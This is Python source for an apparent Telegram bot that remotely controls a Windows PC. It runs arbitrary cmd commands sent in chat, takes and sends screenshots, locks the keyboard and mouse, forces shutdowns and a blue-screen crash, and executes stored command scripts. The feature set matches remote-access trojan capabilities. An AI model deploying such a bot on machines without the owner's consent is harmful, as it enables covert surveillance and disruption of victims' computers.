from BotBase import *
import executer

# Windows commands
@command_handler("hide_windows", "Minimize all windows")
async def hide_windows(message_or_call):
    executer.hide_windows()

    reply_markup = InlineKeyboardMarkup([[FuncInlineKeyboardButton("Show windows", show_windows)]])
    await reply_to(message_or_call, "Windows hidden", reply_markup=reply_markup)


@command_handler("show_windows", "Show all hidden windows")
async def show_windows(message_or_call):
    executer.show_windows()

    reply_markup = InlineKeyboardMarkup([[FuncInlineKeyboardButton("Hide windows", hide_windows)]])
    await reply_to(message_or_call, "Windows shown", reply_markup=reply_markup)

@command_handler("close_window", "Close the top window")
async def close_window(message_or_call):
    executer.close_window()

    reply_markup = InlineKeyboardMarkup([[FuncInlineKeyboardButton("Close another", close_window)]])
    await reply_to(message_or_call, "Window closed", reply_markup=reply_markup)

# Locker commands
@command_handler("lock_mouse", "🖱️ Lock the mouse cursor in place")
async def lock_mouse(message_or_call):
    res = executer.MouseLocker.lock()

    text = "🖱️ Mouse locked" if res else "🖱️ Mouse is already locked"
    reply_markup = InlineKeyboardMarkup([[FuncInlineKeyboardButton("Unlock", unlock_mouse)]])

    await reply_to(message_or_call, text, reply_markup=reply_markup)


@command_handler("unlock_mouse", "🖱️ Unlock the mouse cursor", show=False)
async def unlock_mouse(message_or_call):
    res = executer.MouseLocker.unlock()

    text = "🖱️ Mouse unlocked" if res else "🖱️ Mouse is not locked"
    reply_markup = InlineKeyboardMarkup([[FuncInlineKeyboardButton("Lock", lock_mouse)]])

    await reply_to(message_or_call, text, reply_markup=reply_markup)

@command_handler("lock_keyboard", "⌨️ Lock the keyboard")
async def lock_keyboard(message_or_call):
    res = executer.KeyboardLocker.lock()

    text = "⌨️ Keyboard locked" if res else "⌨️ Keyboard is already locked"
    reply_markup = InlineKeyboardMarkup([[FuncInlineKeyboardButton("Unlock", unlock_keyboard)]])

    await reply_to(message_or_call, text, reply_markup=reply_markup)


@command_handler("unlock_keyboard", "⌨️ Unlock the keyboard", show=False)
async def unlock_keyboard(message_or_call):
    res = executer.KeyboardLocker.unlock()

    text = "⌨️ Keyboard unlocked" if res else "⌨️ Keyboard is not locked"
    reply_markup = InlineKeyboardMarkup([[FuncInlineKeyboardButton("Lock", lock_keyboard)]])

    await reply_to(message_or_call, text, reply_markup=reply_markup)

# Shutdown commands
@command_handler("shutdown", "💻 Shutdown the pc")
async def shutdown(message_or_call):
    await reply_to(message_or_call, "💻 The pc is shutting down...")
    executer.shutdown()

@command_handler("reboot", "💻 Reboot the pc")
async def restart(message_or_call):
    await reply_to(message_or_call, "💻 The pc is rebooting...")
    executer.restart()

@command_handler("logoff", "💻 Logoff the pc")
async def logoff(message_or_call):
    await reply_to(message_or_call, "💻 The pc is loggong off...")
    executer.logoff()

@command_handler("hibernate", "💻 Hibernate the pc")
async def hibernate(message_or_call):
    await reply_to(message_or_call, "💻 The pc is hibernating...")
    executer.hibernate()

@command_handler("crash", "💻 Crash the pc (BSOD)")
async def crash(message_or_call):
    await reply_to(message_or_call, "💻 The pc is crashing...")
    executer.crash()

# Program commands
@command_handler("notepad", "🗒️ Open Notepad")
async def notepad(message):
    split_text = message.text.split()
    text = " ".join(split_text[1:]) if len(split_text) > 1 else None
    executer.open_notepad(text)

    reply_markup = InlineKeyboardMarkup([[FuncInlineKeyboardButton("Close window", close_window)]])
    await reply_to(message, "🗒️ Notepad opened", reply_markup=reply_markup)

@command_handler("cmd", "💻 Execute a cmd command")
async def execute_cmd(message):
    split_text = message.text.split()

    if len(split_text) == 1:
        await reply_to(message, "ERROR: Command needs to be followed by a cmd command")
        return
    
    cmd_command = " ".join(split_text[1:])# if len(split_text) > 1 else None
    ret = executer.execute_cmd(cmd_command)

    await reply_to(message, f"💻 Cmd command executed\n\n{ret}")

@command_handler("site", "🔗 Open a url or search in the browser")
async def site(message):
    split_text = message.text.split()

    if len(split_text) == 1:
        await reply_to(message, "ERROR: Command needs to be followed by a url or a search query")
        return
    
    query = " ".join(split_text[1:])# if len(split_text) > 1 else None
    executer.open_site(query)

    reply_markup = InlineKeyboardMarkup([[FuncInlineKeyboardButton("Close window", close_window)]])
    await reply_to(message, "🔗 Site opened", reply_markup=reply_markup)

# Image commands
@command_handler("screenshot", "⛶ Take a screenshot")
async def take_screenshot(message_or_call):
    screenshot = executer.pyautogui.screenshot()

    reply_markup = InlineKeyboardMarkup([[FuncInlineKeyboardButton("Take another", take_screenshot)]])
    await bot.send_photo(message_or_call.chat.id if type(message_or_call) == Message else message_or_call.message.chat.id, executer.image_to_buffer(screenshot), "⛶ Screenshot", reply_markup=reply_markup)


# Media
@command_handler("photo", show=False)
async def photo_handler(call, medium_name_or_id: str | int, cmd: str | None = None):
    medium = data.get_medium_by_id(medium_name_or_id) if (type(medium_name_or_id) == int) or medium_name_or_id.isdigit() else data.get_medium(medium_name_or_id, "photo")
    
    if not medium:
        await reply_to(call, f"ERROR: Photo medium {medium_name_or_id} not found")
        return
        
    photo = executer.Photo(medium)
    cmd = cmd or "open"

    match cmd:
        case "open":
            photo.open()
            if call.message.text.split()[0] == "GTE":
                await reply_to(call, f"📷 Photo '{medium_name_or_id}' opened")
        case "close":
            photo.close()
            if call.message.text.split()[0] == "GTE":
                await reply_to(call, f"📷 Photo '{medium_name_or_id}' closed")
        case "close_all":
            photo.close_all()
            if call.message.text.split()[0] == "GTE":
                await reply_to(call, f"📷 Photo '{medium_name_or_id}' closed all")
        case "wallpaper":
            photo.set_as_wallpaper()
            if call.message.text.split()[0] == "GTE":
                await reply_to(call, f"📷 Photo '{medium_name_or_id}' set as wallpaper")

@command_handler("audio", show=False)
async def audio_handler(call, medium_name_or_id: str | int, cmd: str | None = None):
    medium = data.get_medium_by_id(medium_name_or_id) if (type(medium_name_or_id) == int) or medium_name_or_id.isdigit() else data.get_medium(medium_name_or_id, "audio")

    if not medium:
        await reply_to(call, f"ERROR: Audio medium {medium_name_or_id} not found")
        return
    
    audio = executer.Audio(medium)
    cmd = cmd or "play"

    match cmd:
        case "play":
            audio.play()
            if call.message.text.split()[0] == "GTE":
                await reply_to(call, f"🎵 Audio '{medium_name_or_id}' playing")
        case "stop":
            audio.stop()
            if call.message.text.split()[0] == "GTE":
                await reply_to(call, f"🎵 Audio '{medium_name_or_id}' stopped")

@command_handler("voice", show=False)
async def voice_handler(call, medium_name_or_id: str | int, cmd: str | None = None):
    medium = data.get_medium_by_id(medium_name_or_id) if (type(medium_name_or_id) == int) or medium_name_or_id.isdigit() else data.get_medium(medium_name_or_id, "voice")

    if not medium:
        await reply_to(call, f"ERROR: Voice medium {medium_name_or_id} not found")
        return
    
    audio = executer.Audio(medium)
    cmd = cmd or "play"

    match cmd:
        case "play":
            audio.play()
            if call.message.text.split()[0] == "GTE":
                await reply_to(call, f"🎤 Voice '{medium_name_or_id}' playing")
        case "stop":
            audio.stop()
            if call.message.text.split()[0] == "GTE":
                await reply_to(call, f"🎤 Voice '{medium_name_or_id}' stopped")

@command_handler("video", show=False)
async def video_handler(call, medium_name_or_id: str | int, cmd: str | None = None):
    medium = data.get_medium_by_id(medium_name_or_id) if (type(medium_name_or_id) == int) or medium_name_or_id.isdigit() else data.get_medium(medium_name_or_id, "video")
    
    if not medium:
        await reply_to(call, f"ERROR: Video medium '{medium_name_or_id}' not found")
        return
        
    video = executer.Video(medium)
    cmd = cmd or "open"

    match cmd:
        case "open":
            video.open()
            if call.message.text.split()[0] == "GTE":
                await reply_to(call, f"📽️ Video '{medium_name_or_id}' opened")
        case "close":
            video.close()
            if call.message.text.split()[0] == "GTE":
                await reply_to(call, f"📽️ Video '{medium_name_or_id}' closed")

@command_handler("file", show=False)
async def file_handler(message: Message, file: File | None = None):
    if not file:
        split_text = message.text.split()
        media_type = split_text[1]
        name = " ".join(split_text[2:])

        medium = data.get_medium(name, media_type)

        if medium:
            file = File(medium)
        else:
            await reply_to(message, f"ERROR: {media_type} file named '{name}' not found")
            return
    
    if file.medium.media_type == "photo":
        text = "📷 Photo"
        reply_markup = InlineKeyboardMarkup([[FuncInlineKeyboardButton("Open", photo_handler, file.medium.id, "open")],
                                             [FuncInlineKeyboardButton("Close", photo_handler, file.medium.id, "close")],
                                             [FuncInlineKeyboardButton("Set as wallpaper", photo_handler, file.medium.id, "wallpaper")]])
    elif file.medium.media_type == "audio":
        text = "🎵 Audio"
        reply_markup = InlineKeyboardMarkup([[FuncInlineKeyboardButton("▶️ Play", audio_handler, file.medium.id, "play")],
                                             [FuncInlineKeyboardButton("⏹️ Stop", audio_handler, file.medium.id, "stop")],])
    elif file.medium.media_type == "voice":
        text = "🎤 Voice"
        reply_markup = InlineKeyboardMarkup([[FuncInlineKeyboardButton("▶️ Play", voice_handler, file.medium.id, "play")],
                                             [FuncInlineKeyboardButton("⏹️ Stop", voice_handler, file.medium.id, "stop")],])
    elif file.medium.media_type == "video":
        text = "📽️ Video"
        reply_markup = InlineKeyboardMarkup([[FuncInlineKeyboardButton("Open", video_handler, file.medium.id, "open")],
                                             [FuncInlineKeyboardButton("Close", video_handler, file.medium.id, "close")],])

    await reply_to(message, text, reply_markup=reply_markup)

set_file_handler(file_handler)

# GTE
@command_handler("gte_handler", show=False)
async def GTE_handler(call: CallbackQuery, gte_file_name: str, cmd: str):
    match cmd:
        case "execute":
            code = executer.GTEFiles.load(gte_file_name)
            print(f"Executing GTE '{gte_file_name}':\n{code}")

            code_lines = code.splitlines()
            for code_line in code_lines:
                split_line = code_line.split()
                command_name = split_line[0]
                args = split_line[1:] if len(split_line) > 1 else None

                if command_name not in FUNC_MAPPINGS.keys():
                    match command_name:
                        case "wait":
                            time = int(args[0]) if args else 1
                            await reply_to(call, f"Waiting {time} second(s)")
                            await asyncio.sleep(time)

                    continue

                if args:
                    await FUNC_MAPPINGS[command_name](call, *args)
                else:
                    await FUNC_MAPPINGS[command_name](call)
        case "delete":
            executer.GTEFiles.delete(gte_file_name)
            await reply_to(call, f"GTE file '{gte_file_name}' deleted")

@command_handler("gte", "Execute a list of commands")
async def GTE(message_or_call: Message | CallbackQuery, gte_file_name: str | None = None):
    if not gte_file_name:
        text_lines = message_or_call.text.splitlines()

        split_line = text_lines[0].split()
        gte_file_name = " ".join(split_line[1:]) if len(split_line) > 1 else None

        if len(text_lines) > 1:
            code = "\n".join(text_lines[1:])
            executer.GTEFiles.save(gte_file_name or "latest", code)
        else:
            if gte_file_name:
                code = executer.GTEFiles.load(gte_file_name)
            else:
                reply_markup = InlineKeyboardMarkup([[FuncInlineKeyboardButton(gte_file_name, "gte", gte_file_name)] for gte_file_name in executer.GTEFiles.files()])
                await reply_to(message_or_call, "GTE files:", reply_markup=reply_markup)
                return
    else:
        code = executer.GTEFiles.load(gte_file_name)

    text = f"GTE '{gte_file_name}':\n\n{code}"
    reply_markup = InlineKeyboardMarkup([[FuncInlineKeyboardButton("Execute", GTE_handler, gte_file_name, "execute")],
                                         [FuncInlineKeyboardButton("Delete", GTE_handler, gte_file_name, "delete")],])
    await reply_to(message_or_call, text, reply_markup=reply_markup)

run()


